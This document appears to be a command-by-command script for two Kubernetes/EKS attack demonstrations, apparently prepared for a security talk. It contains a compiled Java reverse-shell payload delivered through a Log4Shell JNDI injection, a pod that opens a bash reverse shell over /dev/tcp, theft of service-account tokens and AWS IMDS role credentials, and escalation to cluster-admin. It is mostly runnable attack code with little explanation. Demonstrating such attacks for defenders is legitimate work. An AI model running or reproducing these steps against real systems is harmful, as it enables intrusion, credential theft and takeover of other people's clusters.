# Scenario 1

## Part 1: Compromised Pod / Neighbor

```bash
kubectl exec -it deploy/customer-portal -n default -- /bin/bash
```

```bash
nmap -sT -p 80,443,8080 172.31.0.0/16 --open -T5
```

```bash
kubectl get pods -n prod -l app=ci-pipeline-runner \
  -o jsonpath='{.items[0].status.podIP}'
```

```bash
ATTACKER_IP=$(hostname -i)
echo "Attacker IP: $ATTACKER_IP"

cat > /opt/exploits/Exploit.java << JAVA
import java.io.*;
import java.net.*;

public class Exploit {
    static {
        try {
            String host = "${ATTACKER_IP}";
            int port = 4444;
            String[] cmd = {"/bin/sh", "-i"};
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (si.available() > 0) po.write(si.read());
                so.flush(); po.flush();
                Thread.sleep(50);
            }
            p.destroy(); s.close();
        } catch (Exception e) { e.printStackTrace(); }
    }
}
JAVA
cd /opt/exploits && javac -source 1.8 -target 1.8 Exploit.java
```

```bash
cd /opt/exploits && python3 -m http.server 8888 &
java -cp /opt/marshalsec.jar marshalsec.jndi.LDAPRefServer "http://${ATTACKER_IP}:8888/#Exploit" 1389 &
ncat -lvnp 4444 &
```

```bash
NEIGHBOR_IP=
curl -H "X-Api-Version: \${jndi:ldap://${ATTACKER_IP}:1389/Exploit}" \
  http://$NEIGHBOR_IP:8080/ &
```

## Part 2: Move via Service Account

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --insecure-skip-tls-verify --token=$TOKEN auth can-i list pods --all-namespaces
kubectl --insecure-skip-tls-verify --token=$TOKEN auth can-i create pods --all-namespaces
```

```bash
kubectl --insecure-skip-tls-verify --token=$TOKEN get pods -A -ojson \
  | jq -r '.items[] | "\(.metadata.namespace)\t\(.metadata.name)\t\(.spec.serviceAccountName)"'
```

```bash
ncat -lvnp 5555 &
```

```bash
CALLBACK_IP=
kubectl --insecure-skip-tls-verify --token=$TOKEN run pwned-pod \
  -n prod \
  --image=ubuntu \
  --restart=Never \
  --overrides='
{
  "apiVersion": "v1",
  "spec": {
    "serviceAccountName": "cluster-ops-sa"
  }
}' \
  -- /bin/bash -c "while true; do bash -i >& /dev/tcp/${CALLBACK_IP}/5555 0>&1; sleep 2; done"
```

## Part 3: Cluster-Admin

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

apt-get update && apt-get install -y --no-install-recommends curl ca-certificates \
    && curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" \
    && install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl

kubectl --insecure-skip-tls-verify --token=$TOKEN auth can-i '*' '*'
```

```bash
k rollout restart deploy ci-pipeline-runner -n prod
k rollout restart deploy customer-portal
k delete pod pwned-pod -n prod --force
```

---
---

# Scenario 2

## Part 1: Compromised Pod

```bash
kubectl exec -it deploy/debug-dashboard -n dev -- /bin/bash
```

## Part 2: Move via IMDS

```bash
INSTANCE_ID=$(aws ec2 describe-instances --profile research \
  --filters "Name=tag:eks:cluster-name,Values=rsac-demo" \
  --query 'Reservations[0].Instances[0].InstanceId' --output text)

aws ec2 describe-instances --profile research --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].MetadataOptions' --output table
```

```bash
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id $INSTANCE_ID \
  --http-put-response-hop-limit 1 --profile research
```

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id $INSTANCE_ID \
  --http-put-response-hop-limit 2 --profile research
```

```bash
IMDS_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

echo "$CREDS"
```

```bash
curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/user-data
```

```bash
TOKEN=$(aws eks get-token --cluster-name rsac-demo \
  --output json | python3 -c "import sys,json; print(json.load(sys.stdin)['status']['token'])")
```

```bash
NODE_HOSTNAME=ip-172-31-73-24.ec2.internal
kubectl --insecure-skip-tls-verify --token=$TOKEN get pods -A -ojson \
    --field-selector spec.nodeName=$NODE_HOSTNAME
```

```bash
POD_UID=$(kubectl --insecure-skip-tls-verify --token=$TOKEN \
    get pod -n prod cluster-ops-agent -o jsonpath='{.metadata.uid}')

SA_TOKEN=$(kubectl --insecure-skip-tls-verify --token=$TOKEN create token cluster-ops-sa \
    -n prod \
    --audience https://kubernetes.default.svc \
    --duration 3600s \
    --bound-object-kind Pod \
    --bound-object-name cluster-ops-agent \
    --bound-object-uid $POD_UID)
```

## Part 3: Cluster-Admin

```bash
kubectl --insecure-skip-tls-verify --token=$SA_TOKEN auth can-i '*' '*'
```

```bash
k rollout restart deploy debug-dashboard -n dev
```


---
---
